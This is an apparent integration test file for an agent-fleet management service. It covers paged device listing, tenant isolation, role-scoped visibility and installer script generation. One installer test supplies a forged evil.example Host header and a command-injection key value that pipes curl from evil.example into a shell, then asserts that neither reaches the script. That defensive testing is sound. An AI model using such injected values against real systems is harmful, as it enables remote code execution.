/**
 * 79 — W10-1 fleet list (/agents) and installer origin:
 *   79.1 GET /agent/devices?paged=1: chip counts (on the set matched by the
 *        other filters), chips OR-ed, search (hostname / name / IP), group
 *        filter, sort + paging, 24 h counters, 400 on invalid parameters;
 *        the unpaged answer is unchanged (a bare array)
 *   79.2 every member lists the fleet (a read-only viewer included), with
 *        accessLevel on each row; tenant isolation; the god view narrows with
 *        ?tenants= and tags rows with their tenant
 *   79.3 installer scripts embed the configured public origin even with a
 *        forged Host / X-Forwarded-Proto, and never a malformed ?key=
 *   79.4 client: /agents open to every member, Obliance layout (group panel
 *        in a Drawer below lg), batch actions gated by capability and
 *        confirmed, sidebar 'Agents' -> /agents with per-tenant buckets
 */
import { describe, before, after } from 'node:test';
import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import fs from 'node:fs';
import path from 'node:path';
import { startHarness } from '../harness';
import type { Harness, Client } from '../harness';
import { lotIt } from '../lots';
import { T } from '../fixtures';
import { createDevice, createGroup, createKey, createUser, insertBan, insertEvents, nextIp } from '../seed';
import { __setServedAgentVersionForTest } from '../../src/services/agent.service';

const LIST = '/api/agent/devices?paged=1';
const ROOT = path.resolve(__dirname, '../../..');
const read = (rel: string) => fs.readFileSync(path.join(ROOT, rel), 'utf8').replace(/\r\n/g, '\n');

describe('79 agent list + installer origin (W10-1)', () => {
  let h: Harness;
  let tenant: number;
  let groupId: number;
  let admin: Client;
  const dev: Record<string, number> = {};

  before(async () => {
    h = await startHarness();
    const slug = `w101-${crypto.randomBytes(3).toString('hex')}`;
    const [row] = await h.db('tenants').insert({ name: `Fleet ${slug}`, slug }).returning('id') as Array<{ id: number }>;
    tenant = row.id;
    const key = await createKey(h.db, tenant);
    groupId = await createGroup(h.db, { tenantId: tenant, name: 'W101 group' });
    const mk = async (name: string, o: Partial<Parameters<typeof createDevice>[1]> = {}) => {
      const d = await createDevice(h.db, { tenantId: tenant, keyId: key.id, hostname: name, ...o });
      dev[name] = d.id;
      return d.id;
    };
    await mk('alpha-01', { groupId, version: '1.0.0' });
    await mk('alpha-02', { version: '2.0.0' });
    await mk('bravo', { status: 'pending' });
    await mk('sierra', { status: 'suspended' });
    await mk('echo', { version: '2.0.0' });
    await mk('foxtrot', { version: '1.0.0' });
    await h.db('agent_devices').where({ id: dev.echo }).update({ evaluate_only: true });
    await h.db('agent_devices').where({ id: dev['alpha-02'] }).update({ ip: '198.18.79.2', name: 'Zulu display' });
    await h.db('agent_update_attempts').insert({
      device_id: dev.foxtrot, target_version: '2.0.0', offered_count: 3, phase: 'failed', last_error: 'no_progress',
    });
    // 24 h activity: alpha-02 is the busiest; its attacker is banned globally
    // (counted) and by another tenant (not this tenant's ban: not counted).
    const attacker = nextIp();
    await insertEvents(h.db, { deviceId: dev['alpha-02'], tenantId: tenant, ip: attacker, count: 3 });
    await insertBan(h.db, { ip: attacker, scope: 'global' });
    await insertBan(h.db, { ip: attacker, scope: 'tenant', tenantId: T.B });
    await insertEvents(h.db, { deviceId: dev['alpha-01'], tenantId: tenant, ip: nextIp(), count: 1 });
    __setServedAgentVersionForTest('2.0.0');
    admin = await h.adminIn(tenant);
  });

  after(async () => {
    __setServedAgentVersionForTest(undefined);
    await h.close();
  });

  const names = (rows: Array<{ hostname: string }>) => rows.map((r) => r.hostname);

  lotIt('W10-1', '79.1 paged list: counts, chips, search, group, sort, paging, 24 h counters', async () => {
    const all = await admin.get(`${LIST}&pageSize=200`);
    assert.equal(all.status, 200, all.text);
    const data = all.json.data;
    assert.equal(data.total, 6);
    assert.deepEqual(
      { ...data.counts },
      {
        all: 6, online: 0, offline: 4, pending: 1, suspended: 1, refused: 0,
        updating: 0, update_failed: 1, evaluate_only: 1, outdated: 2,
      },
    );
    // Default sort: display name (name, else hostname), ascending.
    assert.deepEqual(names(data.rows), ['alpha-01', 'bravo', 'echo', 'foxtrot', 'sierra', 'alpha-02']);
    const a1 = data.rows.find((r: any) => r.id === dev['alpha-01']);
    assert.equal(a1.groupName, 'W101 group');
    assert.equal(a1.tenantName, `Fleet ${(await h.db('tenants').where({ id: tenant }).first('slug')).slug}`);
    assert.equal(a1.events24h, 1);
    assert.equal(a1.accessLevel, 'rw');

    // Chips are OR-ed; counts stay those of the unfiltered set.
    const ps = await admin.get(`${LIST}&chips=pending,suspended`);
    assert.equal(ps.json.data.total, 2);
    assert.deepEqual(names(ps.json.data.rows).sort(), ['bravo', 'sierra']);
    assert.equal(ps.json.data.counts.all, 6);
    const failed = await admin.get(`${LIST}&chips=update_failed`);
    assert.deepEqual(names(failed.json.data.rows), ['foxtrot']);

    // Search: hostname, display name, IP — and the counts follow the search.
    const alpha = await admin.get(`${LIST}&q=ALPHA`);
    assert.equal(alpha.json.data.total, 2);
    assert.equal(alpha.json.data.counts.all, 2);
    assert.equal(alpha.json.data.counts.outdated, 1);
    assert.deepEqual(names((await admin.get(`${LIST}&q=zulu`)).json.data.rows), ['alpha-02']);
    assert.deepEqual(names((await admin.get(`${LIST}&q=198.18.79`)).json.data.rows), ['alpha-02']);

    // Group filter (recursive through group_closure) and ungrouped.
    const grouped = await admin.get(`${LIST}&groupId=${groupId}&recursive=1`);
    assert.deepEqual(names(grouped.json.data.rows), ['alpha-01']);
    const ungrouped = await admin.get(`${LIST}&groupId=none`);
    assert.equal(ungrouped.json.data.total, 5);

    // Sort + paging.
    const p2 = await admin.get(`${LIST}&sortBy=name&sortOrder=desc&pageSize=2&page=2`);
    assert.equal(p2.json.data.total, 6);
    assert.equal(p2.json.data.page, 2);
    assert.equal(p2.json.data.pageSize, 2);
    assert.deepEqual(names(p2.json.data.rows), ['foxtrot', 'echo']);
    const past = await admin.get(`${LIST}&pageSize=50&page=9`);
    assert.deepEqual(past.json.data.rows, []);
    const busiest = await admin.get(`${LIST}&sortBy=events24h&sortOrder=desc&pageSize=2`);
    assert.deepEqual(names(busiest.json.data.rows), ['alpha-02', 'alpha-01']);
    assert.equal(busiest.json.data.rows[0].events24h, 3);
    assert.equal(busiest.json.data.rows[0].bans24h, 1, "global ban counted, another tenant's ban not");
    assert.equal(busiest.json.data.rows[1].bans24h, 0);
    const byBans = await admin.get(`${LIST}&sortBy=bans24h&sortOrder=desc&pageSize=1`);
    assert.deepEqual(names(byBans.json.data.rows), ['alpha-02']);
    const byVersion = await admin.get(`${LIST}&sortBy=version&sortOrder=desc&chips=offline`);
    assert.deepEqual(names(byVersion.json.data.rows).slice(0, 2).sort(), ['alpha-02', 'echo']);

    // Invalid parameters.
    for (const bad of ['chips=bogus', 'sortBy=password', 'sortOrder=up', 'pageSize=500', 'page=0', 'type=router', 'tenants=x']) {
      assert.equal((await admin.get(`${LIST}&${bad}`)).status, 400, bad);
    }

    // The unpaged answer is unchanged.
    const legacy = await admin.get('/api/agent/devices');
    assert.equal(legacy.status, 200);
    assert.ok(Array.isArray(legacy.json.data));
    assert.equal(legacy.json.data.length, 6);
  });

  lotIt('W10-1', '79.2 viewers list the fleet; tenant isolation; god view narrows by tenant', async () => {
    const viewer = await createUser(h.db, { tenants: [tenant], tenantRole: 'viewer' });
    const vc = await h.login(viewer.username);
    assert.equal((await vc.switchTenant(tenant)).status, 200);
    const r = await vc.get(`${LIST}&pageSize=200`);
    assert.equal(r.status, 200, r.text);
    assert.equal(r.json.data.total, 6);
    assert.ok(r.json.data.rows.every((d: any) => d.accessLevel === 'rw' || d.accessLevel === 'ro'));

    // Team scope (RBAC-8): a member whose team grants one group lists that
    // group only — rows, total and chip counts alike — read-only.
    const scoped = await createUser(h.db, { tenants: [tenant] });
    const [tm] = await h.db('user_teams')
      .insert({ name: `t79-${Date.now()}`, tenant_id: tenant, can_create: false })
      .returning('id') as Array<{ id: number }>;
    await h.db('team_memberships').insert({ team_id: tm.id, user_id: scoped.id });
    await h.db('team_permissions').insert({ team_id: tm.id, scope: 'group', scope_id: groupId, level: 'ro' });
    const sc = await h.login(scoped.username);
    assert.equal((await sc.switchTenant(tenant)).status, 200);
    const rs = await sc.get(`${LIST}&pageSize=200`);
    assert.equal(rs.status, 200, rs.text);
    assert.deepEqual(names(rs.json.data.rows), ['alpha-01']);
    assert.equal(rs.json.data.total, 1);
    assert.equal(rs.json.data.counts.all, 1);
    assert.equal(rs.json.data.counts.pending, 0, 'counts never leak hidden agents');
    assert.equal(rs.json.data.rows[0].accessLevel, 'ro');
    const rsBusy = await sc.get(`${LIST}&sortBy=events24h&sortOrder=desc`);
    assert.deepEqual(names(rsBusy.json.data.rows), ['alpha-01']);

    // A member of tenant B never sees this tenant's agents.
    const b = await h.as('member_b');
    const rb = await b.get(`${LIST}&pageSize=200`);
    assert.equal(rb.status, 200);
    assert.ok(rb.json.data.rows.every((d: any) => d.tenantId === T.B), 'tenant B rows only');
    assert.ok(!rb.json.data.rows.some((d: any) => d.id === dev['alpha-01']));

    // God view: every tenant, narrowed by ?tenants=, rows tagged with their tenant.
    const def = await h.adminIn(T.DEFAULT);
    const god = await def.get(`${LIST}&pageSize=200&tenants=${tenant}`);
    assert.equal(god.status, 200);
    assert.equal(god.json.data.total, 6);
    assert.ok(god.json.data.rows.every((d: any) => d.tenantId === tenant && typeof d.tenantName === 'string'));
    const wide = await def.get(`${LIST}&pageSize=200&tenants=${tenant},${T.B}`);
    assert.ok(wide.json.data.rows.some((d: any) => d.tenantId === T.B));
    // ?tenants= is ignored outside the god view.
    const narrowed = await admin.get(`${LIST}&pageSize=200&tenants=${T.B}`);
    assert.equal(narrowed.json.data.total, 6);
    assert.ok(narrowed.json.data.rows.every((d: any) => d.tenantId === tenant));
  });

  lotIt('W10-1', '79.3 installer scripts embed the configured origin, never a forged Host or a malformed key', async () => {
    const anon = h.anon();
    const key = crypto.randomUUID();
    for (const route of ['linux', 'macos', 'freebsd']) {
      const r = await anon.get(`/api/agent/installer/${route}?key=${key}`, {
        host: 'evil.example:8443',
        headers: { 'x-forwarded-proto': 'https', 'x-forwarded-host': 'evil.example' },
      });
      assert.equal(r.status, 200, `${route}: ${r.text.slice(0, 200)}`);
      assert.match(r.text, /SERVER_URL="http:\/\/verify\.local"/, `${route} embeds APP_URL`);
      assert.ok(!r.text.includes('evil.example'), `${route}: no forged host`);
      assert.ok(r.text.includes(`API_KEY="${key}"`), `${route} embeds the key`);
    }
    // A key that is not a key is not pasted into the script.
    const injected = await anon.get(`/api/agent/installer/linux?key=${encodeURIComponent('x"; curl evil.example | sh; "')}`);
    assert.equal(injected.status, 200);
    assert.ok(!injected.text.includes('curl evil.example'));
    assert.match(injected.text, /API_KEY="__API_KEY__"/);
    // '$' sequences in a value are never read as replacement patterns.
    const dollar = await anon.get(`/api/agent/installer/linux?key=${encodeURIComponent("$'abc$&def")}`);
    assert.ok(!dollar.text.includes("$'abc"));
  });

  lotIt('W10-1', '79.4 client: /agents for every member, layout, gated + confirmed batch actions, sidebar buckets', () => {
    const app = read('client/src/App.tsx');
    const route = app.indexOf('<Route path="/agents" element={<AgentListPage />} />');
    assert.ok(route > 0, '/agents route');
    // Not inside a capability-gated block: the nearest gate opens after it.
    assert.ok(app.indexOf('<ProtectedRoute requiredCapabilities', route) > route);
    assert.ok(!app.slice(0, route).includes('requiredCapabilities'), '/agents is declared before any gated block');

    const layout = read('client/src/components/agents/AgentsPageLayout.tsx');
    assert.match(layout, /useMediaQuery\(MEDIA\.lg\)/);
    assert.match(layout, /<Drawer\b/);
    assert.match(layout, /<GroupSidePanel\b[\s\S]*variant="drawer"/);

    const table = read('client/src/components/agents/AgentTable.tsx');
    assert.match(table, /agentApi\.listPaged\(/);
    for (const cap of ['agents.update', 'agents.approve', 'agents.manage', 'agents.delete']) {
      assert.ok(table.includes(`useCan('${cap}')`), `batch gated by ${cap}`);
    }
    assert.match(table, /usePersistedState<AgentColumn\[\]>\('og-agents-columns'/, 'column picker persisted');
    assert.match(table, /useSessionState<SortState<AgentListSortField>>/, 'sort kept in the session');
    assert.match(table, /await saveCsv\(/, 'CSV export through utils/download');
    assert.ok((table.match(/await confirm\(/g) ?? []).length >= 4, 'update, approve / suspend, uninstall and delete are confirmed');
    assert.match(table, /requireText: String\(ids\.length\)/, 'mass delete / uninstall typed confirmation');
    assert.match(table, /d\.tenantId === currentTenantId && d\.accessLevel !== 'ro'/, 'only own writable rows are selectable');
    assert.doesNotMatch(table, /window\.(?:confirm|alert|prompt)\b/);

    const sidebar = read('client/src/components/layout/Sidebar.tsx');
    assert.match(sidebar, /path: '\/agents', icon: <Cpu size=\{18\} \/>,\s+visible: true/);
    assert.match(sidebar, /path: '\/manage\/agents', icon: <KeyRound size=\{18\} \/>, visible: canSeeAgentAdmin/);
    assert.match(sidebar, /const tenantBuckets = useMemo/);
    assert.match(sidebar, /if \(aId === MASTER_TENANT_ID\) return -1;/, 'Default bucket first');
  });
});
